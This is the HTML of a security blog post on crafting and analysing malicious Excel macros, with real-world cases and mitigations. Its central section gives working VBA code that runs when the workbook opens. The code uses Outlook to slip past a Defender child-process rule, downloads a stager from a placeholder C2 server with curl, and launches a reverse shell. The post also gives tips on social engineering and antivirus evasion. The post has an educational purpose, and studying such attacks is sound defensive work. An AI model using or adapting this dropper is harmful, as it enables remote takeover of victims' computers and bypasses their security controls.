<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Weaponizing Malicious Macros | Martin Kubečka</title><meta name=keywords content="malware,Visual Basic,C2"><meta name=description content="Learn about crafting and analyzing Microsoft Excel malicious macros."><meta name=author content="Martin Kubečka"><link rel=canonical href=https://martinkubecka.sk/posts/2021-05-12-malicious-macros/><link crossorigin=anonymous href=/assets/css/stylesheet.ba00c1f715cc18cbf534f1dd7be1b22fc29e5384ca42c46b68ff6c99b2b92143.css integrity="sha256-ugDB9xXMGMv1NPHde+GyL8KeU4TKQsRraP9smbK5IUM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://martinkubecka.sk/images/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://martinkubecka.sk/images/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://martinkubecka.sk/images/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://martinkubecka.sk/images/favicon/apple-touch-icon.png><link rel=mask-icon href=https://martinkubecka.sk/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Weaponizing Malicious Macros"><meta property="og:description" content="Learn about crafting and analyzing Microsoft Excel malicious macros."><meta property="og:type" content="article"><meta property="og:url" content="https://martinkubecka.sk/posts/2021-05-12-malicious-macros/"><meta property="og:image" content="https://martinkubecka.sk/images/general/malicious_macros/icon.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-05-12T00:00:00+00:00"><meta property="article:modified_time" content="2021-05-12T00:00:00+00:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://martinkubecka.sk/images/general/malicious_macros/icon.png"><meta name=twitter:title content="Weaponizing Malicious Macros"><meta name=twitter:description content="Learn about crafting and analyzing Microsoft Excel malicious macros."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://martinkubecka.sk/posts/"},{"@type":"ListItem","position":3,"name":"Weaponizing Malicious Macros","item":"https://martinkubecka.sk/posts/2021-05-12-malicious-macros/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Weaponizing Malicious Macros","name":"Weaponizing Malicious Macros","description":"Learn about crafting and analyzing Microsoft Excel malicious macros.","keywords":["malware","Visual Basic","C2"],"articleBody":"Introduction Microsoft Excel is a very useful program that makes life easier for millions of people and companies around the world. It is a robust tool for data collection and visualization, creation of calculations and more. Unfortunately, software that offers script-based automation capabilities also has its downsides.\nA macro is a script that is used to automate tasks in Excel documents, e.g. calculations. Because macros are part of an Excel document and can run automatically, they are a good tool for an attacker to control a computer.\nMacros are written in the VBA (Visual Basic) scripting language, which can work with the system application interface from a privileged context (MS Excel), thanks to which it allows good interaction with the operating system. Script execution is configurable according to events that occur based on user action\nAutoExec : Launches when a document is opened AutoNew : Launches when a new document is created AutoOpen : Launches when an existing document is opened AutoClose : Launches when the document is closed where the event triggers malicious code. When malicious code starts executing, the attacker will be able to work with Win32 API, COM objects, VBA code, or it is possible to invoke the loading of their own library.\nAs macro security went unnoticed, Microsoft and other security companies began working on protection mechanisms.\nOne of these protection mechanisms, which is implemented directly in MS Excel, is that macros do not run automatically when a dangerous document is opened.\nAs a result, social engineering methods have begun to be used to force the user to allow the use of macros.\nOne way, for example, might be to make the document look encrypted and ask the user to enable the macro for security reasons. There are no limits to creativity.\nCreating a Malicious Macro Macros can be enabled, but we need an entry point for our malicious program. After macros are enabled, we can proceed to the actual execution of the code. Before describing the technical details, the following infographic accurately describes our process of infecting a computer and taking complete control of it.\nOur event handlers can be registered simply by giving the procedure the same name as the event we want to run, or by naming one of our code modules after the automatic macro and including the procedure in that module.\nIn addition to these application events, the Office documents themselves trigger various events and may contain their own utilities. These event handling procedures are contained in the document instead of in the code module. In our code, we use the Workbook_Open event, which starts when a document is opened.\nPrivate Sub Workbook_Open() AutoRunMacroBypassDownload End Sub This event is executed by a service code located in a separate Module. If we want to create a Shell instance, a rule from MS Defender will block our request. Specifically, Microsoft states the following in its documentation:\nThe rule blocks Office applications from creating child processes. Office applications include Word, Excel, PowerPoint, OneNote and Access. Creating malicious child processes is a common malware strategy. Malware that abuses Office as a vector often runs VBA macros and uses code to download and run additional code.\nWe can notice that the documents do not include Outlook, which we use to create a Shell object and bypass the rule from MS Defender. Then we execute a GET request to the Command and Control Server (also known as C2 or C\u0026C), from where we download a stager that contains an application called Client, which establishes a TCP connection to the C2 server.\nWe decided to compile our own reverse shell written in C# for two main reasons. First of all, it is important to realize that both attackers and antivirus developers have access to programs such as Metasploit and Empire. For this reason, generated reverse shell binaries, whether after obfuscation or injected into a legitimate application, are marked as malicious based on a fingerprint.\nThe second reason is that once we insert any PowerShell cmdlets into a macro, the file is always marked as malicious and Windows Defender removes it as soon as it is created.\n' Bypass defender chiled process protection using outlook process Sub AutoRunMacroBypassDownload() ' create outlook object Set objOL = CreateObject(\"Outlook.Application\") ' create shell object under the outlook object Set WshShell = objOL.CreateObject(\"Wscript.Shell\") ' exec the command from the new shell object ' download stager Set WshShellExec = WshShell.Exec(\"curl http://:/stager.zip --output C:\\Users\\Public\\Documents\\stager.zip\") Application.Wait (Now + TimeValue(\"00:00:03\")) ' unzip stager content Call UnzipAFile(\"C:\\Users\\Public\\Documents\\stager.zip\", \"C:\\Users\\Public\\Documents\\\") Application.Wait (Now + TimeValue(\"00:00:03\")) ' execute encoded reverse shell Set WshShellExec = WshShell.Exec(\"C:\\Users\\Public\\Documents\\Shell.exe\") End Sub Sub UnzipAFile(zippedFileFullName As Variant, unzipToPath As Variant) Dim ShellApp As Object 'Copy the files \u0026 folders from the zip into a folder Set ShellApp = CreateObject(\"Shell.Application\") ShellApp.Namespace(unzipToPath).CopyHere ShellApp.Namespace(zippedFileFullName).items End Sub After launching the Client application, we have gained control over the device and we can proceed with enumeration and subsequent eventual exploitation.\nIn the real world, it would be appropriate to obfuscate our macro as well as the application for establishing a TCP connection, but since this is a demonstration program, this process was not necessary.\nStatic analysis Excel document In the picture above, we can see that apart from Kaspersky antivirus, another relevant antivirus program did not detect that it was a malicious document.\nTCP Client In the case of an application that establishes a TCP connection, this is mainly detected by Microsoft Defender. In 2019, this method was marked as undetectable, but we assume that due to its exposure, MS Defender has recently started to focus on it. Another option would be to use appropriate code obfuscation or write this client in a C++ programming language.\nReal World Examples The use of VBA macros to spread viruses has existed since the creation of VBA itself (1993). This method ceased to be used around the year 2000 because simpler and more reliable methods were found to infect a computer.\nMacros in Office applications began to be abused again in 2012, mainly to collect system information such as IP address, installed applications or running system processes.\nMacro abuse erupted in 2016, when attackers were able to use macros to infect the systems with Cerber ransomware.\nAnother known abuse of macros was in 2019, when attackers used macros to invoke Powershell, which downloaded and launched malware. It was a GandCrab ransomware and a Ursnif Trojan horse aimed at filtering data from the system.\nAlso in 2021, the mentioned Ursnif malware continues to be spread. The target of the attack were Italian banks, of which about 100 were successfully infected. Its attempt was to steal the login details, which were then sent using imitation of Zoom or Webex calls.\nMitigations Globally disable macros for Microsoft Office applications. (Enable or disable macros) Do not open suspicious emails or suspicious attachments. Do not open untrusted .xlsm, .docm, .pptm documents. Delete any emails from unknown people or with suspicious content. Do not use an Administrator account for daily tasks on Windows operating system. Update Windows and antivirus regularly. Back up your documents regularly. Enterprises can prevent macro malware from running executable content using ASR rules. Resources Malicious Macros\nhttps://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/ Macro Malware\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/macro-malware MS Excel Weaponization Techniques\nhttps://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5 Watch Hackers Craft Malicious Office Macros\nhttps://youtu.be/e2icQFxhp3w Real World Examples\nhttps://thehackernews.com/search/label/macros Source code for TCP client\nhttps://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc Thank you for reading and we hope you learned something new.\n","wordCount":"1226","inLanguage":"en","image":"https://martinkubecka.sk/images/general/malicious_macros/icon.png","datePublished":"2021-05-12T00:00:00Z","dateModified":"2021-05-12T00:00:00Z","author":{"@type":"Person","name":"Martin Kubečka"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://martinkubecka.sk/posts/2021-05-12-malicious-macros/"},"publisher":{"@type":"Organization","name":"Martin Kubečka","logo":{"@type":"ImageObject","url":"https://martinkubecka.sk/images/favicon/favicon.ico"}}}</script></head><body id=top><script>window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://martinkubecka.sk accesskey=h title="$ cd /home/ (Alt + H)">$ cd /home/</a><div class=logo-switches></div></div><button id=menu-trigger aria-haspopup=menu aria-label="Menu Button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button><ul class="menu hidden"><li><a href=https://martinkubecka.sk/posts/ title=Posts><span>Posts</span></a></li><li><a href=https://martinkubecka.sk/security-advisories/ title="Security Advisories"><span>Security Advisories</span></a></li><li><a href=https://martinkubecka.sk/library/ title=Library><span>Library</span></a></li><li><a href=https://martinkubecka.sk/about/ title=About><span>About</span></a></li><li><a href=https://martinkubecka.sk/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://openguards.martinkubecka.sk/ title=OpenGuards><span>OpenGuards</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://martinkubecka.sk>Home</a>&nbsp;»&nbsp;<a href=https://martinkubecka.sk/posts/>Posts</a></div><h1 class=post-title>Weaponizing Malicious Macros</h1><div class=post-description>Learn about crafting and analyzing Microsoft Excel malicious macros.</div><div class=post-meta><span title='2021-05-12 00:00:00 +0000 +0000'>May 12, 2021</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;1226 words&nbsp;·&nbsp;Martin Kubečka</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#creating-a-malicious-macro>Creating a Malicious Macro</a></li><li><a href=#static-analysis>Static analysis</a><ul><li><a href=#excel-document>Excel document</a></li><li><a href=#tcp-client>TCP Client</a></li></ul></li><li><a href=#real-world-examples>Real World Examples</a></li><li><a href=#mitigations>Mitigations</a></li><li><a href=#resources>Resources</a></li></ul></nav></div></details></div><div class=post-content><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>Microsoft Excel is a very useful program that makes life easier for millions of people and companies around the world. It is a robust tool for data collection and visualization, creation of calculations and more. Unfortunately, software that offers script-based automation capabilities also has its downsides.</p><p>A <strong>macro</strong> is a script that is used to automate tasks in Excel documents, e.g. calculations. Because macros are part of an Excel document and can run automatically, they are a good tool for an attacker to control a computer.</p><p>Macros are written in the <strong>VBA</strong> (Visual Basic) scripting language, which can work with the system application interface from a privileged context (MS Excel), thanks to which it allows good interaction with the operating system. Script execution is configurable according to events that occur based on user action</p><ul><li><code>AutoExec</code> : Launches when a document is opened</li><li><code>AutoNew</code> : Launches when a new document is created</li><li><code>AutoOpen</code> : Launches when an existing document is opened</li><li><code>AutoClose</code> : Launches when the document is closed</li></ul><p>where the event triggers malicious code. When malicious code starts executing, the attacker will be able to work with Win32 API, COM objects, VBA code, or it is possible to invoke the loading of their own library.</p><p>As macro security went unnoticed, Microsoft and other security companies began working on protection mechanisms.</p><p>One of these protection mechanisms, which is implemented directly in MS Excel, is that macros do not run automatically when a dangerous document is opened.</p><p>As a result, <strong>social engineering</strong> methods have begun to be used to force the user to allow the use of macros.</p><p>One way, for example, might be to make the document look encrypted and ask the user to enable the macro for security reasons. There are no limits to creativity.</p><hr><h2 id=creating-a-malicious-macro>Creating a Malicious Macro<a hidden class=anchor aria-hidden=true href=#creating-a-malicious-macro>#</a></h2><p>Macros can be enabled, but we need an entry point for our malicious program. After macros are enabled, we can proceed to the actual execution of the code. Before describing the technical details, the following infographic accurately describes our process of infecting a computer and taking complete control of it.</p><p><img loading=lazy src=/images/general/malicious_macros/infographic.png alt></p><p>Our event handlers can be registered simply by giving the procedure the same name as the event we want to run, or by naming one of our code modules after the automatic macro and including the procedure in that module.</p><p>In addition to these application events, the Office documents themselves trigger various events and may contain their own utilities. These event handling procedures are contained in the document instead of in the code module. In our code, we use the <code>Workbook_Open</code> event, which starts when a document is opened.</p><pre tabindex=0><code class=language-vba data-lang=vba>Private Sub Workbook_Open()

    AutoRunMacroBypassDownload
    
End Sub
</code></pre><p>This event is executed by a service code located in a separate Module. If we want to create a <strong>Shell</strong> instance, a rule from <strong>MS Defender</strong> will block our request. Specifically, Microsoft states the following in its documentation:</p><blockquote><p>The rule blocks Office applications from creating child processes. Office applications include Word, Excel, PowerPoint, OneNote and Access. Creating malicious child processes is a common malware strategy. Malware that abuses Office as a vector often runs VBA macros and uses code to download and run additional code.</p></blockquote><p>We can notice that the documents do not include <strong>Outlook</strong>, which we use to create a Shell object and bypass the rule from MS Defender. Then we execute a GET request to the Command and Control Server (also known as C2 or C&amp;C), from where we download a <strong>stager</strong> that contains an application called <strong>Client</strong>, which establishes a <strong>TCP connection</strong> to the C2 server.</p><p>We decided to compile our own reverse shell written in C# for two main reasons. First of all, it is important to realize that both attackers and antivirus developers have access to programs such as <strong>Metasploit</strong> and <strong>Empire</strong>. For this reason, generated reverse shell binaries, whether after obfuscation or injected into a legitimate application, are marked as malicious based on a fingerprint.</p><p>The second reason is that once we insert any <strong>PowerShell</strong> cmdlets into a macro, the file is always marked as malicious and Windows Defender removes it as soon as it is created.</p><pre tabindex=0><code class=language-vba data-lang=vba>&#39; Bypass defender chiled process protection using outlook process
Sub AutoRunMacroBypassDownload()

    &#39; create outlook object
    Set objOL = CreateObject(&#34;Outlook.Application&#34;)
    
    &#39; create shell object under the outlook object
    Set WshShell = objOL.CreateObject(&#34;Wscript.Shell&#34;)
    
    &#39; exec the command from the new shell object
    &#39; download stager
    Set WshShellExec = WshShell.Exec(&#34;curl http://&lt;SERVER IP&gt;:&lt;SERVER PORT&gt;/stager.zip --output C:\Users\Public\Documents\stager.zip&#34;)
    Application.Wait (Now + TimeValue(&#34;00:00:03&#34;))
    
    &#39; unzip stager content
    Call UnzipAFile(&#34;C:\Users\Public\Documents\stager.zip&#34;, &#34;C:\Users\Public\Documents\&#34;)
    Application.Wait (Now + TimeValue(&#34;00:00:03&#34;))
    
    &#39; execute encoded reverse shell
    Set WshShellExec = WshShell.Exec(&#34;C:\Users\Public\Documents\Shell.exe&#34;)
      
End Sub

Sub UnzipAFile(zippedFileFullName As Variant, unzipToPath As Variant)

    Dim ShellApp As Object

    &#39;Copy the files &amp; folders from the zip into a folder
    Set ShellApp = CreateObject(&#34;Shell.Application&#34;)
    ShellApp.Namespace(unzipToPath).CopyHere ShellApp.Namespace(zippedFileFullName).items

End Sub
</code></pre><p>After launching the <strong>Client</strong> application, we have gained control over the device and we can proceed with enumeration and subsequent eventual exploitation.</p><p>In the real world, it would be appropriate to obfuscate our macro as well as the application for establishing a TCP connection, but since this is a demonstration program, this process was not necessary.</p><hr><h2 id=static-analysis>Static analysis<a hidden class=anchor aria-hidden=true href=#static-analysis>#</a></h2><h3 id=excel-document>Excel document<a hidden class=anchor aria-hidden=true href=#excel-document>#</a></h3><p><img loading=lazy src=/images/general/malicious_macros/static-doc.png alt></p><p>In the picture above, we can see that apart from <strong>Kaspersky</strong> antivirus, another relevant antivirus program did not detect that it was a malicious document.</p><h3 id=tcp-client>TCP Client<a hidden class=anchor aria-hidden=true href=#tcp-client>#</a></h3><p><img loading=lazy src=/images/general/malicious_macros/static-client.png alt></p><p>In the case of an application that establishes a TCP connection, this is mainly detected by <strong>Microsoft Defender</strong>. In 2019, this method was marked as undetectable, but we assume that due to its exposure, MS Defender has recently started to focus on it. Another option would be to use appropriate code obfuscation or write this client in a C++ programming language.</p><hr><h2 id=real-world-examples>Real World Examples<a hidden class=anchor aria-hidden=true href=#real-world-examples>#</a></h2><p>The use of VBA macros to spread viruses has existed since the creation of VBA itself (1993). This method ceased to be used around the year 2000 because simpler and more reliable methods were found to infect a computer.</p><p>Macros in Office applications began to be abused again in 2012, mainly to collect system information such as IP address, installed applications or running system processes.</p><p>Macro abuse erupted in 2016, when attackers were able to use macros to infect the systems with <strong>Cerber</strong> ransomware.</p><p>Another known abuse of macros was in 2019, when attackers used macros to invoke Powershell, which downloaded and launched malware. It was a <strong>GandCrab</strong> ransomware and a <strong>Ursnif</strong> Trojan horse aimed at filtering data from the system.</p><p>Also in 2021, the mentioned <strong>Ursnif</strong> malware continues to be spread. The target of the attack were Italian banks, of which about 100 were successfully infected. Its attempt was to steal the login details, which were then sent using imitation of <strong>Zoom</strong> or <strong>Webex</strong> calls.</p><hr><h2 id=mitigations>Mitigations<a hidden class=anchor aria-hidden=true href=#mitigations>#</a></h2><ul><li>Globally disable macros for Microsoft Office applications. (<a href=https://support.office.com/article/Enable-or-disable-macros-in-Office-documents-7b4fdd2e-174f-47e2-9611-9efe4f860b12>Enable or disable macros</a>)</li><li>Do not open suspicious emails or suspicious attachments.</li><li>Do not open untrusted <code>.xlsm</code>, <code>.docm</code>, <code>.pptm</code> documents.</li><li>Delete any emails from unknown people or with suspicious content.</li><li>Do not use an Administrator account for daily tasks on Windows operating system.</li><li>Update Windows and antivirus regularly.</li><li>Back up your documents regularly.</li><li>Enterprises can prevent macro malware from running executable content using <a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction>ASR rules</a>.</li></ul><hr><h2 id=resources>Resources<a hidden class=anchor aria-hidden=true href=#resources>#</a></h2><ul><li><p>Malicious Macros</p><ul><li><a href=https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/>https://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/</a></li></ul></li><li><p>Macro Malware</p><ul><li><a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/macro-malware>https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/macro-malware</a></li></ul></li><li><p>MS Excel Weaponization Techniques</p><ul><li><a href=https://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5>https://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5</a></li></ul></li><li><p>Watch Hackers Craft Malicious Office Macros</p><ul><li><a href=https://youtu.be/e2icQFxhp3w>https://youtu.be/e2icQFxhp3w</a></li></ul></li><li><p>Real World Examples</p><ul><li><a href=https://thehackernews.com/search/label/macros>https://thehackernews.com/search/label/macros</a></li></ul></li><li><p>Source code for TCP client</p><ul><li><a href=https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc>https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc</a></li></ul></li></ul><hr><p><em>Thank you for reading and we hope you learned something new.</em></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://martinkubecka.sk/tags/malware/>malware</a></li><li><a href=https://martinkubecka.sk/tags/visual-basic/>Visual Basic</a></li><li><a href=https://martinkubecka.sk/tags/c2/>C2</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://martinkubecka.sk>Martin Kubečka</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let b=document.querySelector("#menu-trigger"),m=document.querySelector(".menu");b.addEventListener("click",function(){m.classList.toggle("hidden")}),document.body.addEventListener("click",function(e){b.contains(e.target)||m.classList.add("hidden")})</script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>